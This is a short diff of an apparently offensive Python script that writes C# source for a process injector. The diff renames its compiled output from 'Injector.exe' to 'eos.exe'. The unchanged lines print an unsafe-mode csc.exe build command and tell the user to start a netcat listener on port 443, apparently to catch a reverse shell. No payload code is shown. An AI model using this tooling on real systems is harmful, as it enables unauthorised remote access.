@@ -169,5 +169,5 @@ if __name__ == "__main__":
         f.write(code)
     print("[+] C# source written to eos.cs")
     print("[*] Compile as EXE (x64):")
-    print("    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /platform:x64 /unsafe /out:Injector.exe eos.cs")
+    print("    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /platform:x64 /unsafe /out:eos.exe eos.cs")
     print("[*] Start listener IE: sudo nc -lvnp 443")
